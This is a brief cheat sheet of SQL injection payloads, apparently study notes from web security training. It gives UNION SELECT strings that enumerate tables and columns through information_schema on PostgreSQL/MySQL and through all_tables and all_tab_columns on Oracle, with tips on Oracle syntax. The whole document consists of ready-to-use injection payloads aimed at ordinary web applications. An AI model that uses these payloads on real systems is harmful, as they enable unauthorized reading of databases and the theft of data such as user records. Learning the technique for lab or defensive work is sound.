# Database Enumeration

# Database Enumeration (PostgreSQL vs Oracle)

### Non-Oracle (PostgreSQL/MySQL)
- List Tables: `' UNION SELECT table_name, NULL FROM information_schema.tables--`
- List Columns: `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_table'--`

### Oracle
- Rule: Always use `FROM DUAL`.
- List Tables: `' UNION SELECT table_name, NULL FROM all_tables--`
- List Columns: `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_ABC'--`
- Note: Oracle table/column names are usually UPPERCASE.
